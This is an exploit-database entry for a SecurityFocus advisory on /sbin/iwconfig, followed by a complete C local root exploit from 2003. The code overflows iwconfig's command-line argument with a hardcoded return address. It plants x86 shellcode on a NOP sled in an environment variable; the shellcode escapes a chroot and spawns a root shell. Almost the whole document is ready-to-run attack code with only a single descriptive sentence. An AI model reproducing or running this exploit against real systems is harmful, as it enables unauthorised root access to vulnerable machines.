// source: https://www.securityfocus.com/bid/8901/info

A problem has been identified in the iwconfig program when handling strings on the commandline. Because of this, a local attacker may be able to gain elevated privileges.

/*
  Name: iw-config.c
  Copyright: !sh2k+!tc2k
  Author: heka
  Date: 11/11/2003
  Greets: bx, pintos, eksol, hex, keyhook, grass, toolman, rD, shellcode, dunric, termid, kewlcat, JiNKS
  Description: /sbin/iwconfig - local root exploit
  iwconfig manipulate the basic wireless parameters

*/

#include <stdio.h>

#define BIN     "/sbin/iwconfig"

unsigned char shellcode[] =
                  "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\xb0\x2e"
                  "\xcd\x80\x31\xc0\x53\x68\x77\x30\x30\x74\x89\xe3"
                  "\xb0\x27\xcd\x80\x31\xc0\xb0\x3d\xcd\x80\x31\xc0"
                  "\x31\xdb\x31\xc9\xb1\x0a\x50\x68\x2e\x2e\x2f\x2f"
                  "\xe2\xf9\x89\xe3\xb0\x0c\xcd\x80\x31\xc0\x31\xdb"
                  "\x6a\x2e\x89\xe3\xb0\x3d\xcd\x80\x31\xc0\x31\xdb"
                  "\x31\xc9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                  "\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd"
                  "\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80";

int
main ()
{
   int x;
   char buf[97], out[1337], *buffer;
   unsigned long ret_add = 0xbffffbb8, *add_ptr ;
   buffer = buf;
   add_ptr = (long *)buffer;
   for (x=0; x<97-1; x+=4)
   *(add_ptr++)=ret_add;
   memset ((char *)out, 0x90, 1337);
   memcpy ((char *)out + 333, shellcode, strlen(shellcode));
   memcpy((char *)out, "OUT=", 4);
   putenv(out);
   execl (BIN, BIN, buf, NULL);
   return 0;
}